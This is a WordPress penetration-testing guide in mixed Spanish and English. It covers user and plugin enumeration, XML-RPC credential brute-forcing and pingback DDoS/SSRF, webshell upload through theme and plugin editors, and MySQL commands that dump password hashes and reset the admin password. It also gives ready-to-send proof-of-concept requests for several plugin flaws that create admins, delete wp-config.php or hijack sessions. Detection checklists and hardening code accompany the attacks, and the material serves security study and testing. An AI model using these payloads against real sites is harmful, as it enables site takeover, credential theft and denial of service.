# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` contains useful information such as the version WordPress installed.
- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- The `wp-content` folder is the main directory where plugins and themes are stored.
- `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
- `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
- `wp-sitemap.xml` In Wordpress versions 5.5 and greater, Worpress generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.

**Post exploitation**

- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

### Users Permissions

- **Administrator**
- **Editor**: Publish and manages his and others posts
- **Author**: Publish and manage his own posts
- **Contributor**: Write and manage his posts but cannot publish them
- **Subscriber**: Browser posts and edit their profile

## **Passive Enumeration**

### **Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Archivos de enlace CSS

![](<../../images/image (533).png>)

- Archivos JavaScript

![](<../../images/image (524).png>)

### Obtener plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtener temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraer versiones en general
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeraci√≥n activa

### Plugins and Themes

Probablemente no podr√°s encontrar todos los Plugins and Themes posibles. Para descubrirlos todos, necesitar√°s **Brute Force activamente una lista de Plugins and Themes** (esperemos que existan herramientas automatizadas que contengan estas listas).

### Usuarios

- **ID Brute:** Obtienes usuarios v√°lidos de un sitio WordPress mediante Brute Forcing los IDs de usuario:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si las respuestas son **200** o **30X**, eso significa que el id es **v√°lido**. Si la respuesta es **400**, entonces el id es **inv√°lido**.

- **wp-json:** Tambi√©n puedes intentar obtener informaci√≥n sobre los usuarios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Otro endpoint `/wp-json/` que puede revelar alguna informaci√≥n sobre usuarios es:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Ten en cuenta que este endpoint s√≥lo expone usuarios que han hecho una publicaci√≥n. **Solo se proporcionar√° informaci√≥n sobre los usuarios que tengan esta funci√≥n habilitada**.

Tambi√©n ten en cuenta que **/wp-json/wp/v2/pages** could leak direcciones IP.

- **Login username enumeration**: Al iniciar sesi√≥n en **`/wp-login.php`** el mensaje es diferente e indica si el nombre de usuario existe o no.

### XML-RPC

Si `xml-rpc.php` est√° activo puedes realizar un credentials brute-force o usarlo para lanzar ataques DoS a otros recursos. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Para comprobar si est√° activo intenta acceder a _**/xmlrpc.php**_ y enviar esta petici√≥n:

**Comprobar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** son algunos de los m√©todos que pueden usarse para brute-force credentials. Si puedes encontrar cualquiera de ellos, puedes enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
El mensaje _"Incorrect username or password"_ dentro de una respuesta con c√≥digo 200 deber√≠a aparecer si las credenciales no son v√°lidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando las credenciales correctas puedes subir un archivo. En la respuesta aparecer√° la ruta ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este m√©todo est√° pensado para programas y no para humanos, y es antiguo, por lo que no soporta 2FA. As√≠ que, si tienes creds v√°lidas pero la entrada principal est√° protegida por 2FA, **podr√≠as abusar de xmlrpc.php para login con esas creds salt√°ndote la 2FA**. Ten en cuenta que no podr√°s realizar todas las acciones que puedes hacer a trav√©s de la console, pero aun as√≠ podr√≠as llegar a RCE como Ippsec lo explica en [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si puedes encontrar el m√©todo _**pingback.ping**_ dentro de la lista puedes hacer que Wordpress env√≠e una petici√≥n arbitraria a cualquier host/puerto.\
Esto puede usarse para pedirle a **miles** de **sitios** Wordpress que **accedan** a una **ubicaci√≥n** (causando as√≠ un **DDoS** en ese objetivo) o puedes usarlo para hacer que **Wordpress** escanee alguna **red** interna (puedes indicar cualquier puerto).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si obtienes **faultCode** con un valor **mayor** que **0** (17), significa que el puerto est√° abierto.

Consulta el uso de **`system.multicall`** en la secci√≥n anterior para aprender c√≥mo abusar de este m√©todo para provocar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este archivo suele existir en la ra√≠z del sitio Wordpress: **`/wp-cron.php`**\
Cuando a este archivo se le **accede** se ejecuta una **consulta** MySQL "**intensa**", por lo que podr√≠a ser usado por **attackers** para **causar** un **DoS**.\
Adem√°s, por defecto, `wp-cron.php` se ejecuta en cada carga de p√°gina (cada vez que un cliente solicita cualquier p√°gina de Wordpress), lo que en sitios de alto tr√°fico puede causar problemas (DoS).

Se recomienda deshabilitar Wp-Cron y crear un cronjob real en el host que ejecute las acciones necesarias en intervalos regulares (sin causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Prueba acceder a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ y el sitio Worpress puede realizar una solicitud hacia ti.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta herramienta comprueba si existe **methodName: pingback.ping** y la ruta **/wp-json/oembed/1.0/proxy** y, si existen, intenta exploitarlos.

## Herramientas autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtener acceso sobrescribiendo un bit

M√°s que un ataque real, esto es una curiosidad. En el CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) pod√≠as voltear 1 bit de cualquier archivo de wordpress. As√≠ que pod√≠as modificar la posici√≥n `5389` del archivo `/var/www/html/wp-includes/user.php` para aplicar un NOP a la operaci√≥n NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modificando un php del tema usado (se requieren credenciales de admin)**

Apariencia ‚Üí Editor de temas ‚Üí Plantilla 404 (a la derecha)

Cambia el contenido por un shell php:

![](<../../images/image (384).png>)

Busca en internet c√≥mo puedes acceder a esa p√°gina actualizada. En este caso debes acceder aqu√≠: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puedes usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obtener una sesi√≥n.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Subir y activar un plugin malicioso

Este m√©todo implica la instalaci√≥n de un plugin malicioso conocido por ser vulnerable y que puede explotarse para obtener un web shell. Este proceso se lleva a cabo a trav√©s del WordPress dashboard de la siguiente manera:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navega al WordPress dashboard, luego ve a `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Una vez que el plugin est√© instalado correctamente, debe activarse desde el dashboard.
4. **Exploitation**:
- Con el plugin "reflex-gallery" instalado y activado, puede explotarse ya que se conoce que es vulnerable.
- El framework Metasploit proporciona un exploit para esta vulnerabilidad. Cargando el m√≥dulo apropiado y ejecutando comandos espec√≠ficos, se puede establecer una sesi√≥n meterpreter, otorgando acceso no autorizado al sitio.
- Se se√±ala que este es solo uno de los muchos m√©todos para explotar un sitio WordPress.

El contenido incluye ayudas visuales que muestran los pasos en el WordPress dashboard para instalar y activar el plugin. Sin embargo, es importante notar que explotar vulnerabilidades de esta manera es ilegal y poco √©tico sin la debida autorizaci√≥n. Esta informaci√≥n debe usarse de manera responsable y solo en un contexto legal, como pruebas de penetraci√≥n con permiso expl√≠cito.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS a RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crea un usuario en WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Sube tu plugin personalizado (backdoor) a WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita plugins integrados en WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita temas integrados en WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personalizados para plugins/temas de terceros de WordPress.

## Post Explotaci√≥n

Extraer nombres de usuario y contrase√±as:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiar la contrase√±a del admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest de Plugins de Wordpress

### Superficie de ataque

Saber c√≥mo un plugin de Wordpress puede exponer funcionalidad es clave para encontrar vulnerabilidades en su funcionalidad. Puedes encontrar c√≥mo un plugin podr√≠a exponer funcionalidad en los siguientes puntos y algunos ejemplos de plugins vulnerables en [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Una de las formas en que un plugin puede exponer funciones a los usuarios es v√≠a AJAX handlers. Estas funciones podr√≠an contener bugs de l√≥gica, autorizaci√≥n o autenticaci√≥n. Adem√°s, es bastante frecuente que estas funciones vayan a basar tanto la autenticaci√≥n como la autorizaci√≥n en la existencia de un wordpress nonce que **cualquier usuario autenticado en la instancia de Wordpress podr√≠a tener** (independientemente de su rol).

Estas son las funciones que se pueden usar para exponer una funci√≥n en un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**El uso de `nopriv` hace que el endpoint sea accesible por cualquier usuario (incluso no autenticados).**

> [!CAUTION]
> Adem√°s, si la funci√≥n solo est√° comprobando la autorizaci√≥n del usuario con la funci√≥n `wp_verify_nonce`, esta funci√≥n √∫nicamente verifica que el usuario haya iniciado sesi√≥n; por lo general no comprueba el rol del usuario. Por lo tanto, usuarios con pocos privilegios podr√≠an tener acceso a acciones de alto privilegio.

- **REST API**

Tambi√©n es posible exponer funciones de wordpress registrando una REST API usando la funci√≥n `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` es una funci√≥n callback que comprueba si un usuario dado est√° autorizado para invocar el m√©todo de la API.

**Si se utiliza la funci√≥n integrada `__return_true`, simplemente omitir√° la comprobaci√≥n de permisos de usuario.**

- **Acceso directo al archivo php**

Por supuesto, Wordpress usa PHP y los archivos dentro de los plugins son directamente accesibles desde la web. Por tanto, si un plugin expone alguna funcionalidad vulnerable que se activa simplemente al acceder al archivo, podr√° ser explotada por cualquier usuario.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Algunos plugins implementan atajos de "trusted header" para integraciones internas o reverse proxies y luego usan ese header para establecer el contexto de usuario actual para las solicitudes REST. Si el header no est√° ligado criptogr√°ficamente a la petici√≥n por un componente upstream, un atacante puede falsificarlo y acceder a rutas REST privilegiadas como administrador.

- Impacto: escalada de privilegios no autenticada hasta administrador mediante la creaci√≥n de un nuevo usuario a trav√©s de la ruta REST de usuarios del core.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (fuerza el user ID 1, t√≠picamente la primera cuenta de administrador).
- Ruta explotada: `POST /wp-json/wp/v2/users` con un array de roles con privilegios elevados.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por qu√© funciona

- El plugin asigna un header controlado por el cliente al estado de autenticaci√≥n y omite las comprobaciones de capacidades.
- WordPress core espera la capacidad `create_users` para esta ruta; el hack del plugin la elude estableciendo directamente el contexto del usuario actual a partir del header.

Indicadores de √©xito esperados

- HTTP 201 con un body JSON que describe el usuario creado.
- Un nuevo usuario admin visible en `wp-admin/users.php`.

Lista de verificaci√≥n de detecci√≥n

- Hacer grep de `getallheaders()`, `$_SERVER['HTTP_...']`, o SDKs de vendor que lean headers personalizados para establecer el contexto de usuario (p. ej., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisar las registraciones REST en busca de callbacks privilegiados que carezcan de comprobaciones robustas de `permission_callback` y en su lugar dependan de headers de la petici√≥n.
- Buscar usos de las funciones core de gesti√≥n de usuarios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que est√©n protegidos solo por valores de header.

Endurecimiento

- Nunca derives autenticaci√≥n o autorizaci√≥n de headers controlados por el cliente.
- Si un reverse proxy debe inyectar identidad, termina la confianza en el proxy y elimina las copias entrantes (p. ej., `unset X-Wcpay-Platform-Checkout-User` en el edge), luego pasa un token firmado y verif√≠calo server-side.
- Para rutas REST que realizan acciones privilegiadas, requiere comprobaciones `current_user_can()` y un `permission_callback` estricto (NO uses `__return_true`).
- Prefiere auth first-party (cookies, application passwords, OAuth) sobre la ‚Äúimpersonation‚Äù v√≠a headers.

References: see the links at the end of this page for a public case and broader analysis.

### Eliminaci√≥n arbitraria de archivos sin autenticar v√≠a wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frecuentemente exponen handlers AJAX a trav√©s de los hooks `wp_ajax_` y `wp_ajax_nopriv_`. Cuando la variante **_nopriv_** se usa **el callback se vuelve accesible por visitantes no autenticados**, por lo que cualquier acci√≥n sensible debe adicionalmente implementar:

1. Una **comprobaci√≥n de capacidad** (p. ej. `current_user_can()` o al menos `is_user_logged_in()`), y
2. Un **nonce CSRF** validado con `check_ajax_referer()` / `wp_verify_nonce()`, y
3. **Saneamiento / validaci√≥n estricta de la entrada**.

El theme multiprop√≥sito Litho (< 3.1) olvid√≥ esos 3 controles en la funcionalidad *Remove Font Family* y termin√≥ distribuyendo el siguiente c√≥digo (simplificado):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introducidos por este fragmento:

* **Acceso no autenticado** ‚Äì el `wp_ajax_nopriv_` hook est√° registrado.
* **No nonce / capability check** ‚Äì cualquier visitante puede acceder al endpoint.
* **No path sanitisation** ‚Äì la cadena controlada por el usuario `fontfamily` se concatena a una ruta del sistema de ficheros sin filtrado, permitiendo el cl√°sico `../../` traversal.

#### Explotaci√≥n

Un atacante puede eliminar cualquier archivo o directorio **por debajo del directorio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando una sola petici√≥n HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Porque `wp-config.php` se encuentra fuera de *uploads*, cuatro secuencias `../` son suficientes en una instalaci√≥n por defecto. Eliminar `wp-config.php` fuerza a WordPress a entrar en el *asistente de instalaci√≥n* en la siguiente visita, permitiendo una toma completa del sitio (el atacante simplemente proporciona una nueva configuraci√≥n de DB y crea un usuario administrador).

Otros objetivos con impacto incluyen archivos de plugin/tema `.php` (para romper plugins de seguridad) o reglas `.htaccess`.

#### Lista de comprobaci√≥n de detecci√≥n

* Cualquier callback `add_action( 'wp_ajax_nopriv_...')` que llame a helpers del sistema de archivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenaci√≥n de entrada de usuario no saneada en rutas (buscar `$_POST`, `$_GET`, `$_REQUEST`).
* Ausencia de `check_ajax_referer()` y `current_user_can()`/`is_user_logged_in()`.

#### Endurecimiento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Siempre** trata cualquier operaci√≥n de escritura/eliminaci√≥n en disco como privilegiada y verifica doblemente:
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Muchos plugins implementan una funcionalidad "view as role" o de cambio temporal de rol guardando el/los role(s) originales en user meta para que puedan ser restaurados m√°s tarde. Si la ruta de restauraci√≥n depende solo de par√°metros de request (e.g., `$_REQUEST['reset-for']`) y de una lista mantenida por el plugin sin verificar capabilities ni un nonce v√°lido, esto se convierte en una vertical privilege escalation.

Un ejemplo real se encontr√≥ en el plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La rama de reset restauraba roles bas√°ndose en `reset-for=<username>` si el nombre de usuario aparec√≠a en un array interno `$options['viewing_admin_as_role_are']`, pero no realizaba ni una comprobaci√≥n `current_user_can()` ni una verificaci√≥n de nonce antes de eliminar los roles actuales y volver a a√±adir los roles guardados desde user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por qu√© es explotable

- Conf√≠a en `$_REQUEST['reset-for']` y en una opci√≥n del plugin sin autorizaci√≥n del lado del servidor.
- Si un usuario previamente ten√≠a privilegios m√°s altos guardados en `_asenha_view_admin_as_original_roles` y fue degradado, puede restaurarlos accediendo a la ruta de reset.
- En algunas implementaciones, cualquier usuario autenticado podr√≠a desencadenar un reset para otro nombre de usuario a√∫n presente en `viewing_admin_as_role_are` (autorizaci√≥n rota).

Requisitos del ataque

- Versi√≥n vulnerable del plugin con la funcionalidad habilitada.
- La cuenta objetivo tiene un rol de alto privilegio obsoleto almacenado en user meta por uso anterior.
- Cualquier sesi√≥n autenticada; falta nonce/capability en el flujo de reset.

Explotaci√≥n (ejemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
En compilaciones vulnerables, esto elimina los roles actuales y vuelve a a√±adir los roles originales guardados (p. ej., `administrator`), effectively escalating privileges.

Detection checklist

- Busca funcionalidades de cambio de rol que persistan ‚Äúroles originales‚Äù en user meta (p. ej., `_asenha_view_admin_as_original_roles`).
- Identifica rutas de reinicio/restauraci√≥n que:
- Leer nombres de usuario desde `$_REQUEST` / `$_GET` / `$_POST`.
- Modificar roles mediante `add_role()` / `remove_role()` sin `current_user_can()` y `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizar bas√°ndose en un array de opciones del plugin (p. ej., `viewing_admin_as_role_are`) en lugar de en las capacidades del actor.

Hardening

- Aplicar comprobaciones de capacidades en cada rama que cambie estado (p. ej., `current_user_can('manage_options')` o m√°s estrictas).
- Requerir nonces para todas las mutaciones de roles/permisos y verificarlas: `check_admin_referer()` / `wp_verify_nonce()`.
- No confiar en nombres de usuario suministrados por la solicitud; resolver el usuario objetivo en el servidor bas√°ndose en el actor autenticado y una pol√≠tica expl√≠cita.
- Invalidar el estado de ‚Äúroles originales‚Äù en actualizaciones de perfil/rol para evitar restauraciones obsoletas de altos privilegios:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Considere almacenar un estado m√≠nimo y usar tokens con tiempo limitado y protegidos por capacidades para cambios temporales de rol.

---

### Escalada de privilegios sin autenticar mediante cambio de usuario confiado por cookie en public init (Service Finder ‚Äúsf-booking‚Äù)

Algunos plugins conectan helpers de cambio de usuario al hook p√∫blico `init` y derivan la identidad de una cookie controlada por el cliente. Si el c√≥digo llama a `wp_set_auth_cookie()` sin verificar autenticaci√≥n, capacidades y un nonce v√°lido, cualquier visitante no autenticado puede forzar el inicio de sesi√≥n como un ID de usuario arbitrario.

Patr√≥n vulnerable t√≠pico (simplificado de Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por qu√© es explotable

- El hook p√∫blico `init` hace que el manejador sea accesible para usuarios no autenticados (no hay comprobaci√≥n `is_user_logged_in()`).
- La identidad se deriva de una cookie modificable por el cliente (`original_user_id`).
- Una llamada directa a `wp_set_auth_cookie($uid)` inicia sesi√≥n al solicitante como ese usuario sin comprobaciones de capability/nonce.

Explotaci√≥n (sin autenticaci√≥n)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Consideraciones de WAF para WordPress/plugin CVEs

Los WAFs gen√©ricos de edge/servidor est√°n afinados para patrones amplios (SQLi, XSS, LFI). Muchas vulnerabilidades de alto impacto en WordPress/plugin son fallos de l√≥gica/auth espec√≠ficos de la aplicaci√≥n que parecen tr√°fico benigno a menos que el motor entienda las rutas de WordPress y la sem√°ntica del plugin.

Notas ofensivas

- Dir√≠gete a endpoints espec√≠ficos de plugin con payloads limpios: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Prueba primero las rutas unauth (AJAX `nopriv`, REST con permissive `permission_callback`, public shortcodes). Los payloads por defecto suelen funcionar sin ofuscaci√≥n.
- Casos t√≠picos de alto impacto: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Notas defensivas

- No conf√≠es en firmas gen√©ricas de WAF para proteger CVEs de plugin. Implementa parches virtuales a nivel de aplicaci√≥n, espec√≠ficos para la vulnerabilidad, o actualiza r√°pidamente.
- Prefiere comprobaciones de seguridad de tipo positivo en el c√≥digo (capabilities, nonces, strict input validation) sobre filtros regex negativos.

## Protecci√≥n de WordPress

### Actualizaciones regulares

Aseg√∫rate de que WordPress, plugins y themes est√©n actualizados. Tambi√©n confirma que la actualizaci√≥n autom√°tica est√© habilitada en wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Adem√°s, **instala √∫nicamente plugins y temas de WordPress confiables**.

### Plugins de seguridad

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Otras recomendaciones**

- Elimina el usuario predeterminado **admin**
